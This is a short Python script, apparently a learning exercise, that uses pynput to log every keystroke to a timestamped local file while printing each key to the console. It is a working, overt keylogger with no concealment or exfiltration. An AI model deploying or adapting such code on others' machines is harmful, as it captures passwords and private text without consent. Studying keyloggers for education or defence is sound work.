from pynput import keyboard
import os
import datetime

#to create a new file everytime code is run
log_filename = f"keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

def keyPressed(key):
    print("CWD:", os.getcwd())
    print("Key pressed:", str(key))

    with open(log_filename, "a") as logKey:
        try:
            # for normal characters (letters, numbers, symbols)
            logKey.write(key.char)
        except AttributeError:
            # for special keys (enter, shift)
            if key == keyboard.Key.enter:
                logKey.write("\n") #make new line when clicking 'enter'
            else:
                logKey.write(f" [{key}] ")

if __name__ == "__main__":
    print("Logging to:", log_filename)
    
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
